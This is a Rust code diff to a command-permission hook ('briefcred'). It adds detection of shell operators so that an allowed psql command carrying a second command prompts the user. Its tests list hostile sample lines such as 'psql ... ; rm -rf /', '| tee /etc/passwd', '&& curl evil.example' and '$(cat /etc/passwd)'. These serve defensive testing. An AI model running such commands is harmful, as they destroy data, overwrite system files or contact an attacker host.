@@ -156,6 +156,24 @@ pub fn decide(
             format!("briefcred could not check this command: {why}"),
             None,
         )),
+        PolicyAnswer::Allowed if rule.rewrite && is_compound(command) => {
+            // The daemon was asked about the command's *words*, because
+            // `split_command` is not a shell. For a plain command those words
+            // are the command. For `psql … | tee /etc/passwd` they are not: the
+            // rewrite hands the whole line back to a shell, which then runs a
+            // second program the daemon never saw and which briefcred would be
+            // vouching for. So the answer is `ask` — never `allow`.
+            Some(HookOutput::new(
+                Decision::Ask,
+                format!(
+                    "briefcred: profile `{}` permits the first command, but this line has a \
+                     shell operator in it and briefcred cannot vouch for what the rest of it \
+                     runs",
+                    rule.profile
+                ),
+                None,
+            ))
+        }
         PolicyAnswer::Allowed => {
             let updated_input = rule.rewrite.then(|| UpdatedInput {
                 command: rewrite(&rule.profile, command),
@@ -171,6 +189,27 @@ pub fn decide(
             Some(HookOutput::new(rule.decision, reason, updated_input))
         }
     }
+}
+
+/// The shell metacharacters that make a command line more than one command.
+///
+/// Not an exhaustive shell grammar and not trying to be. Each of these can
+/// introduce a second program on a line the daemon only judged the first of,
+/// and the cost of listing one that turns out to be harmless is a prompt.
+const SHELL_OPERATORS: [&str; 8] = ["|", ";", "&&", "||", ">", "<", "$(", "`"];
+
+/// Whether `command` runs, or could run, more than the one program the daemon
+/// was asked about.
+///
+/// Deliberately naive: a `|` inside a quoted argument counts. Treating a quoted
+/// pipe as safe would mean re-implementing the quoting rules of whatever shell
+/// eventually runs the line, and being wrong there turns an `ask` into an
+/// `allow` for a command briefcred never checked. Being wrong the other way
+/// turns it into a prompt.
+pub fn is_compound(command: &str) -> bool {
+    SHELL_OPERATORS
+        .iter()
+        .any(|operator| command.contains(operator))
 }
 
 /// The command line that runs `command` under briefcred.
@@ -278,6 +317,52 @@ rules:
                 .map(|u| u.command.as_str()),
             Some("briefcred exec --profile=db-ro -- psql -c 'SELECT 1'")
         );
+    }
+
+    #[test]
+    fn an_allow_and_rewrite_rule_only_asks_when_the_line_is_more_than_one_command() {
+        // Every one of these matches the `^psql ` allow-and-rewrite rule, and
+        // every one of them puts a second program on the line. Rewriting it
+        // would hand the whole thing to a shell with briefcred's blessing on a
+        // command the daemon judged only the first word of.
+        for command in [
+            "psql -c 'SELECT 1' | tee /etc/passwd",
+            "psql -c 'SELECT 1'; rm -rf /",
+            "psql -c 'SELECT 1' && curl evil.example",
+            "psql -c 'SELECT 1' || curl evil.example",
+            "psql -c 'SELECT 1' > /etc/passwd",
+            "psql -f - < /etc/passwd",
+            "psql -c $(cat /etc/passwd)",
+            "psql -c `cat /etc/passwd`",
+        ] {
+            let output = decide(&rules(), command, allows).unwrap();
+            assert_eq!(decision_of(&output), "ask", "{command}");
+            assert!(
+                output.hook_specific_output.updated_input.is_none(),
+                "{command} must not be rewritten"
+            );
+        }
+
+        // And a plain one still runs, or the rule would be useless.
+        for command in ["psql -c 'SELECT 1'", "psql --dbname app -c \"SELECT 2\""] {
+            let output = decide(&rules(), command, allows).unwrap();
+            assert_eq!(decision_of(&output), "allow", "{command}");
+            assert!(
+                output.hook_specific_output.updated_input.is_some(),
+                "{command} must still be rewritten"
+            );
+        }
+    }
+
+    #[test]
+    fn a_deny_rule_still_denies_a_compound_command_rather_than_asking() {
+        // The escalation only ever goes towards a prompt. A line that a `deny`
+        // rule matches is refused whatever else is on it.
+        let output = decide(&rules(), "psql -c 'DROP TABLE t' | tee out", |_| {
+            panic!("a deny rule must not need the daemon")
+        })
+        .unwrap();
+        assert_eq!(decision_of(&output), "deny");
     }
 
     #[test]
